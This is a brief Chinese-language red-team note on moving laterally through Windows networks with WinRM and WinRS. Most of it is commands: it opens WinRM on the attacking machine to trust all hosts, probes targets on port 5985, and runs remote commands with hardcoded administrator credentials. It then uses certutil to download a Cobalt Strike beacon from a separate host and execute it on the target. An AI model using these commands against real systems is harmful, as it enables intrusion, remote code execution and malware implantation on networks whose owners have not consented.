WinRM 代表 Windows 远程管理，是一种允许管理员远程执行系统管理任务的服务。
WinRS 连接命令。
默认情况下支持 Kerberos 和 NTLM 身份验证以及基本身份验证。

移动条件：双方都启用的 WinRM RS 的服务，5985端口，知道账号密码。
使用此服务需要管理员级别凭据。
Windows 2008 以上版本默认自动状态，Windows Vista/win7 上必须手动启动；
Windows 2012 之后的版本默认允许远程任意主机来管理。

## **利用**
攻击机开启：
winrm quickconfig -q
winrm set winrm/config/Client @{TrustedHosts="*"}

1.探针可用：
cs 内置端口扫描 5985
powershell Get-WmiObject -Class win32_service | Where-Object 
{$_.name -like "WinRM"}

2.连接执行：
```
winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 命令

winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 whoami
```
3.上线 CS&MSF:
```
winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 
"cmd.exe /c certutil -urlcache -split -f 
http://192.168.3.31/beacon.exe beacon.exe & beacon.exe"
```
4.CS 目标列表-横向移动-winsm